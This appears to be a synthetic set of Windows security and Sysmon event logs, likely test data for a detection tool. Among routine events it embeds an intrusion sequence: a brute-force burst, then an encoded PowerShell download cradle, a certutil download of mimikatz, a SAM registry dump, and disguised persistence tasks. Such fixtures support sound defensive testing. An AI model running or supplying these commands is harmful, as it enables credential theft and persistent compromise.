[
  {"TimeCreated": "2025-03-10T06:00:01Z", "EventID": 4624, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC01", "EventData": {"TargetUserName": "jdoe", "TargetDomainName": "CORP", "IpAddress": "10.0.1.10", "LogonType": 2}},
  {"TimeCreated": "2025-03-10T06:00:05Z", "EventID": 4672, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC01", "EventData": {"SubjectUserName": "SYSTEM", "PrivilegeList": "SeAssignPrimaryTokenPrivilege\n\t\tSeTcbPrivilege\n\t\tSeDebugPrivilege"}},
  {"TimeCreated": "2025-03-10T06:01:00Z", "EventID": 4688, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC01", "EventData": {"NewProcessName": "C:\\Windows\\System32\\taskhostw.exe", "CommandLine": "taskhostw.exe", "SubjectUserName": "SYSTEM"}},
  {"TimeCreated": "2025-03-10T06:05:00Z", "EventID": 4624, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC02", "EventData": {"TargetUserName": "asmith", "TargetDomainName": "CORP", "IpAddress": "10.0.1.20", "LogonType": 2}},
  {"TimeCreated": "2025-03-10T06:05:02Z", "EventID": 4688, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC02", "EventData": {"NewProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"", "SubjectUserName": "asmith"}},
  {"TimeCreated": "2025-03-10T06:10:00Z", "EventID": 4624, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "FILE-SVR01", "EventData": {"TargetUserName": "svc_backup", "TargetDomainName": "CORP", "IpAddress": "10.0.2.10", "LogonType": 3}},
  {"TimeCreated": "2025-03-10T06:10:05Z", "EventID": 4663, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "FILE-SVR01", "EventData": {"SubjectUserName": "svc_backup", "ObjectName": "D:\\Backups\\daily_2025-03-10.bak"}},
  {"TimeCreated": "2025-03-10T06:15:00Z", "EventID": 4688, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC03", "EventData": {"NewProcessName": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "svchost.exe -k netsvcs -p", "SubjectUserName": "SYSTEM"}},
  {"TimeCreated": "2025-03-10T06:20:00Z", "EventID": 4624, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC03", "EventData": {"TargetUserName": "mchen", "TargetDomainName": "CORP", "IpAddress": "10.0.1.30", "LogonType": 2}},
  {"TimeCreated": "2025-03-10T06:25:00Z", "EventID": 4688, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC03", "EventData": {"NewProcessName": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer", "SubjectUserName": "mchen"}},
  {"TimeCreated": "2025-03-10T06:30:00Z", "EventID": 4634, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC01", "EventData": {"TargetUserName": "jdoe", "LogonType": 2}},
  {"TimeCreated": "2025-03-10T06:30:01Z", "EventID": 4624, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC01", "EventData": {"TargetUserName": "jdoe", "TargetDomainName": "CORP", "IpAddress": "10.0.1.10", "LogonType": 2}},
  {"TimeCreated": "2025-03-10T07:00:00Z", "EventID": 4688, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC02", "EventData": {"NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\Scripts\\update-inventory.ps1", "SubjectUserName": "svc_deploy"}},
  {"TimeCreated": "2025-03-10T07:05:00Z", "EventID": 4624, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "PRINT-SVR01", "EventData": {"TargetUserName": "asmith", "TargetDomainName": "CORP", "IpAddress": "10.0.1.20", "LogonType": 3}},
  {"TimeCreated": "2025-03-10T07:10:00Z", "EventID": 5156, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WEB-SVR01", "EventData": {"Application": "\\device\\harddiskvolume2\\inetpub\\wwwroot\\app.exe", "Direction": "Inbound", "SourceAddress": "203.0.113.50", "DestPort": "443"}},
  {"TimeCreated": "2025-03-10T07:15:00Z", "EventID": 4688, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "DC-01", "EventData": {"NewProcessName": "C:\\Windows\\System32\\lsass.exe", "CommandLine": "C:\\Windows\\System32\\lsass.exe", "SubjectUserName": "SYSTEM"}},

  {"TimeCreated": "2025-03-10T08:00:01Z", "EventID": 4625, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WEB-SVR01", "EventData": {"TargetUserName": "admin", "TargetDomainName": "CORP", "IpAddress": "198.51.100.77", "LogonType": 3, "Status": "0xC000006D"}},
  {"TimeCreated": "2025-03-10T08:00:03Z", "EventID": 4625, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WEB-SVR01", "EventData": {"TargetUserName": "admin", "TargetDomainName": "CORP", "IpAddress": "198.51.100.77", "LogonType": 3, "Status": "0xC000006D"}},
  {"TimeCreated": "2025-03-10T08:00:05Z", "EventID": 4625, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WEB-SVR01", "EventData": {"TargetUserName": "admin", "TargetDomainName": "CORP", "IpAddress": "198.51.100.77", "LogonType": 3, "Status": "0xC000006D"}},
  {"TimeCreated": "2025-03-10T08:00:07Z", "EventID": 4625, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WEB-SVR01", "EventData": {"TargetUserName": "admin", "TargetDomainName": "CORP", "IpAddress": "198.51.100.77", "LogonType": 3, "Status": "0xC000006D"}},
  {"TimeCreated": "2025-03-10T08:00:09Z", "EventID": 4625, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WEB-SVR01", "EventData": {"TargetUserName": "admin", "TargetDomainName": "CORP", "IpAddress": "198.51.100.77", "LogonType": 3, "Status": "0xC000006D"}},
  {"TimeCreated": "2025-03-10T08:00:11Z", "EventID": 4625, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WEB-SVR01", "EventData": {"TargetUserName": "admin", "TargetDomainName": "CORP", "IpAddress": "198.51.100.77", "LogonType": 3, "Status": "0xC000006D"}},
  {"TimeCreated": "2025-03-10T08:00:13Z", "EventID": 4625, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WEB-SVR01", "EventData": {"TargetUserName": "admin", "TargetDomainName": "CORP", "IpAddress": "198.51.100.77", "LogonType": 3, "Status": "0xC000006D"}},
  {"TimeCreated": "2025-03-10T08:00:15Z", "EventID": 4625, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WEB-SVR01", "EventData": {"TargetUserName": "admin", "TargetDomainName": "CORP", "IpAddress": "198.51.100.77", "LogonType": 3, "Status": "0xC000006D"}},
  {"TimeCreated": "2025-03-10T08:00:17Z", "EventID": 4625, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WEB-SVR01", "EventData": {"TargetUserName": "admin", "TargetDomainName": "CORP", "IpAddress": "198.51.100.77", "LogonType": 3, "Status": "0xC000006D"}},
  {"TimeCreated": "2025-03-10T08:00:19Z", "EventID": 4625, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WEB-SVR01", "EventData": {"TargetUserName": "admin", "TargetDomainName": "CORP", "IpAddress": "198.51.100.77", "LogonType": 3, "Status": "0xC000006D"}},

  {"TimeCreated": "2025-03-10T08:05:00Z", "EventID": 4688, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC02", "EventData": {"NewProcessName": "C:\\Windows\\System32\\notepad.exe", "CommandLine": "notepad.exe C:\\Users\\asmith\\Documents\\notes.txt", "SubjectUserName": "asmith"}},
  {"TimeCreated": "2025-03-10T08:10:00Z", "EventID": 4624, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC04", "EventData": {"TargetUserName": "rjones", "TargetDomainName": "CORP", "IpAddress": "10.0.1.40", "LogonType": 2}},
  {"TimeCreated": "2025-03-10T08:15:00Z", "EventID": 4688, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC04", "EventData": {"NewProcessName": "C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\devenv.exe", "CommandLine": "devenv.exe ThreatLens.sln", "SubjectUserName": "rjones"}},

  {"TimeCreated": "2025-03-10T09:00:00Z", "EventID": 4624, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "DC-01", "EventData": {"TargetUserName": "admin", "TargetDomainName": "CORP", "IpAddress": "198.51.100.77", "LogonType": 3}},
  {"TimeCreated": "2025-03-10T09:00:30Z", "EventID": 4624, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "FILE-SVR01", "EventData": {"TargetUserName": "admin", "TargetDomainName": "CORP", "IpAddress": "198.51.100.77", "LogonType": 3}},
  {"TimeCreated": "2025-03-10T09:01:00Z", "EventID": 4624, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WEB-SVR01", "EventData": {"TargetUserName": "admin", "TargetDomainName": "CORP", "IpAddress": "198.51.100.77", "LogonType": 3}},
  {"TimeCreated": "2025-03-10T09:01:30Z", "EventID": 4624, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "DB-SVR01", "EventData": {"TargetUserName": "admin", "TargetDomainName": "CORP", "IpAddress": "198.51.100.77", "LogonType": 10}},

  {"TimeCreated": "2025-03-10T09:05:00Z", "EventID": 4672, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "DC-01", "EventData": {"SubjectUserName": "admin", "SubjectDomainName": "CORP", "PrivilegeList": "SeDebugPrivilege\n\t\tSeBackupPrivilege\n\t\tSeRestorePrivilege"}},

  {"TimeCreated": "2025-03-10T09:10:00Z", "EventID": 4688, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC01", "EventData": {"NewProcessName": "C:\\Windows\\System32\\calc.exe", "CommandLine": "calc.exe", "SubjectUserName": "jdoe"}},
  {"TimeCreated": "2025-03-10T09:12:00Z", "EventID": 4688, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC03", "EventData": {"NewProcessName": "C:\\Windows\\explorer.exe", "CommandLine": "explorer.exe", "SubjectUserName": "mchen"}},

  {"TimeCreated": "2025-03-10T09:15:00Z", "EventID": 1, "Source": "Microsoft-Windows-Sysmon", "Computer": "DC-01", "EventData": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4ANwA3AC8AcAAuAHAAcwAxACcAKQA=", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "CORP\\admin"}},

  {"TimeCreated": "2025-03-10T09:20:00Z", "EventID": 4624, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC05", "EventData": {"TargetUserName": "lgarcia", "TargetDomainName": "CORP", "IpAddress": "10.0.1.50", "LogonType": 2}},
  {"TimeCreated": "2025-03-10T09:25:00Z", "EventID": 4688, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC05", "EventData": {"NewProcessName": "C:\\Program Files\\Slack\\slack.exe", "CommandLine": "\"C:\\Program Files\\Slack\\slack.exe\" --startup", "SubjectUserName": "lgarcia"}},

  {"TimeCreated": "2025-03-10T09:30:00Z", "EventID": 1, "Source": "Microsoft-Windows-Sysmon", "Computer": "DC-01", "EventData": {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache -split -f https://198.51.100.77/tools/mimikatz.exe C:\\Temp\\debug.exe", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "CORP\\admin"}},
  {"TimeCreated": "2025-03-10T09:32:00Z", "EventID": 1, "Source": "Microsoft-Windows-Sysmon", "Computer": "DC-01", "EventData": {"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg save HKLM\\SAM C:\\Temp\\s.hiv", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "CORP\\admin"}},

  {"TimeCreated": "2025-03-10T09:35:00Z", "EventID": 4688, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC02", "EventData": {"NewProcessName": "C:\\Windows\\System32\\mstsc.exe", "CommandLine": "mstsc.exe /v:FILE-SVR01", "SubjectUserName": "asmith"}},
  {"TimeCreated": "2025-03-10T09:40:00Z", "EventID": 4624, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "DC-02", "EventData": {"TargetUserName": "svc_monitor", "TargetDomainName": "CORP", "IpAddress": "10.0.2.5", "LogonType": 3}},

  {"TimeCreated": "2025-03-10T09:45:00Z", "EventID": 1, "Source": "Microsoft-Windows-Sysmon", "Computer": "DC-01", "EventData": {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\Temp\\debug.exe\" /sc daily /st 03:00 /ru SYSTEM", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "CORP\\admin"}},
  {"TimeCreated": "2025-03-10T09:47:00Z", "EventID": 1, "Source": "Microsoft-Windows-Sysmon", "Computer": "DC-01", "EventData": {"Image": "C:\\Windows\\System32\\sc.exe", "CommandLine": "sc create WinDefendUpdate binPath= \"C:\\Temp\\debug.exe\" start= auto", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "User": "CORP\\admin"}},

  {"TimeCreated": "2025-03-10T10:00:00Z", "EventID": 4624, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC01", "EventData": {"TargetUserName": "jdoe", "TargetDomainName": "CORP", "IpAddress": "10.0.1.10", "LogonType": 2}},
  {"TimeCreated": "2025-03-10T10:05:00Z", "EventID": 4688, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC01", "EventData": {"NewProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "CommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\jdoe\\Documents\\report.docx\"", "SubjectUserName": "jdoe"}},
  {"TimeCreated": "2025-03-10T10:10:00Z", "EventID": 4634, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WS-PC05", "EventData": {"TargetUserName": "lgarcia", "LogonType": 2}},
  {"TimeCreated": "2025-03-10T10:15:00Z", "EventID": 5156, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "WEB-SVR01", "EventData": {"Application": "\\device\\harddiskvolume2\\inetpub\\wwwroot\\app.exe", "Direction": "Inbound", "SourceAddress": "203.0.113.100", "DestPort": "443"}},
  {"TimeCreated": "2025-03-10T10:20:00Z", "EventID": 4688, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "DC-01", "EventData": {"NewProcessName": "C:\\Windows\\System32\\gpupdate.exe", "CommandLine": "gpupdate /force", "SubjectUserName": "svc_deploy"}},
  {"TimeCreated": "2025-03-10T10:25:00Z", "EventID": 4624, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "FILE-SVR01", "EventData": {"TargetUserName": "mchen", "TargetDomainName": "CORP", "IpAddress": "10.0.1.30", "LogonType": 3}},
  {"TimeCreated": "2025-03-10T10:30:00Z", "EventID": 4663, "Source": "Microsoft-Windows-Security-Auditing", "Computer": "FILE-SVR01", "EventData": {"SubjectUserName": "mchen", "ObjectName": "D:\\SharedDocs\\Q1_Report.xlsx"}}
]
